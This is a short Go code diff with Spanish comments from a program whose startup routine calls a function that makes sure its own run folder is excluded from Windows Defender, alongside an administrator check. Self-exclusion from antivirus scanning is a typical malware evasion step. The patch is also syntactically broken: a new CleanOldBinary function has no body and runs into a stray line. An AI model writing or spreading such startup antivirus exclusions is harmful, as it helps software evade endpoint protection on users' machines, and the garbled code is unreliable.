@@ -9,7 +9,8 @@ import (
 )
 
 // EnsureDefenderExclusion comprueba y asegura que la carpeta de ejecución esté excluida en Defender
-func EnsureDefenderExclusion() {
+func CleanOldBinary()
+	EnsureDefenderExclusion() {
 exePath, err := os.Executable()
 if err != nil {
 return
@@ -39,6 +40,7 @@ return cmd.Run() == nil
 
 // CheckStartup ejecuta las verificaciones críticas al arrancar
 func CheckStartup() bool {
-EnsureDefenderExclusion()
+CleanOldBinary()
+	EnsureDefenderExclusion()
 return IsAdmin()
 }
